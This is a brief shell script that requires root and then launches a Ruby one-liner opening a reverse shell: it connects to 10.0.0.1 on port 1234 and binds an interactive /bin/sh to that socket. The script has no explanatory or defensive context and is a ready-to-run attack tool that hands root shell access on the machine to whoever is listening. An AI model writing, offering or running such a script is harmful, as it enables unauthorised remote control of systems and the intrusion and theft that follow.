#!/bin/sh
## Created by Jasutin

checkroot() {
    SAVE_LD_PRELOAD="$LD_PRELOAD"
    unset LD_PRELOAD
    if [ "$(id -u)" -ne 0 ]; then
        printf "\e[1;31mPlease, run as root!\n\e[0m"
        exit 1
     fi
     LD_PRELOAD="$SAVE_LD_PRELOAD"
}

checkroot

clear;

if

printf "\nrunning..."

then

ruby -rsocket -e 'f = TCPSocket.open("10.0.0.1", 1234).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f ,f ,f)'

else

	exit 1;
	return 0;

fi;

